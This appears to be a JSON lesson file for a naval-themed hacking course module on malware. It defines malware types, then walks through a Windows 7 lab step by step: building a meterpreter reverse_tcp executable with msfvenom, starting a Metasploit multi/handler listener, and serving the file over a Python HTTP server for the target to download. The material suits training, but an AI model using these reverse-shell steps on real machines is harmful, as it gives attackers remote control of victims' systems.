@@ -1,0 +1,162 @@
+{
+  "id": "module-07",
+  "title": "MODULE 07: MALWARE & THREATS",
+  "theme": {
+    "style": "naval",
+    "primaryColor": "#001B33",
+    "accentColor": "#00A8C6",
+    "textColor": "#E6F1F5"
+  },
+  "blocks": [
+
+    {
+      "type": "header",
+      "content": "WHAT IS MALWARE?"
+    },
+    {
+      "type": "text",
+      "content": "Malware means any software created to damage, steal, or take control of a system. In naval style, malware is like placing a harmful device inside an enemy ship to disable important functions."
+    },
+    {
+      "type": "points",
+      "content": [
+        "Malware can steal data",
+        "Malware can damage systems",
+        "Malware can take full control",
+        "Malware can spy on users"
+      ]
+    },
+
+    {
+      "type": "header",
+      "content": "WHAT ARE THREATS?"
+    },
+    {
+      "type": "text",
+      "content": "A threat is anything that can harm a system. It can be a hacker, malware, misconfiguration, or even weak passwords. In naval style, a threat is any danger approaching your ship — enemy submarines, hidden mines, or spying drones."
+    },
+    {
+      "type": "points",
+      "content": [
+        "Cyber attackers",
+        "Malicious software",
+        "Weak security settings",
+        "Human mistakes"
+      ]
+    },
+
+    {
+      "type": "header",
+      "content": "TYPES OF MALWARE"
+    },
+    {
+      "type": "points",
+      "content": [
+        "Virus – Spreads by attaching to files",
+        "Worm – Spreads across networks without help",
+        "Trojan – Looks safe but contains harmful code",
+        "Ransomware – Locks files until payment is made",
+        "Spyware – Steals private information",
+        "Adware – Shows unwanted ads and tracks behavior",
+        "Rootkit – Hides attacker activity inside the system",
+        "Keylogger – Records everything typed on the keyboard"
+      ]
+    },
+
+    {
+      "type": "gallery",
+      "images": [
+        "https://i.imgur.com/8nlHqLb.jpeg",
+        "https://i.imgur.com/5qTtYuk.jpeg"
+      ]
+    },
+
+    {
+      "type": "header",
+      "content": "CREATING MALWARE USING METASPLOIT"
+    },
+    {
+      "type": "text",
+      "content": "We will create a Windows malware payload using Metasploit (MSFvenom). This payload will be used only inside the lab environment. In naval comparison, this is like crafting a controlled training torpedo to test ship defenses safely."
+    },
+    {
+      "type": "points",
+      "content": [
+        "Command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o malware.exe",
+        "Why: It creates a Windows executable that connects back to our attack machine."
+      ]
+    },
+    {
+      "type": "points",
+      "content": [
+        "Command: msfconsole",
+        "Why: To start Metasploit Framework for handling the connection."
+      ]
+    },
+    {
+      "type": "points",
+      "content": [
+        "Command: use exploit/multi/handler",
+        "Why: To set up a listener that waits for the malware to connect back."
+      ]
+    },
+    {
+      "type": "points",
+      "content": [
+        "Command: set payload windows/meterpreter/reverse_tcp",
+        "Why: To match the payload created with MSFvenom."
+      ]
+    },
+    {
+      "type": "points",
+      "content": [
+        "Command: exploit",
+        "Why: Starts listening for the target system to run the malware."
+      ]
+    },
+
+    {
+      "type": "header",
+      "content": "SENDING MALWARE TO WINDOWS 7 MACHINE"
+    },
+    {
+      "type": "text",
+      "content": "In the lab, we have a Windows 7 machine configured. We will send the malware to the Windows machine and wait for it to execute. Once executed, a Meterpreter session will open. This is like planting a tracking device on an enemy ship and waiting for it to activate."
+    },
+    {
+      "type": "points",
+      "content": [
+        "Use HTTP server: python3 -m http.server 80",
+        "Why: To easily share the malware file with the Windows machine."
+      ]
+    },
+    {
+      "type": "points",
+      "content": [
+        "Download malware from Windows: http://YOUR_IP/malware.exe",
+        "Why: To allow Windows 7 machine to download the payload."
+      ]
+    },
+    {
+      "type": "points",
+      "content": [
+        "Wait for connection: Meterpreter session will open in Metasploit",
+        "Why: Confirms successful system hacking inside the lab."
+      ]
+    },
+
+    {
+      "type": "gallery",
+      "images": [
+        "https://i.imgur.com/4o2xFJU.jpeg",
+        "https://i.imgur.com/Zf0q9aG.jpeg"
+      ]
+    },
+
+    {
+      "type": "text",
+      "content": ">> MODULE 07 COMPLETE. NEXT WE MOVE TO SNIFFING, MITM, AND PASSWORD CAPTURE TECHNIQUES."
+    }
+
+  ]
+}
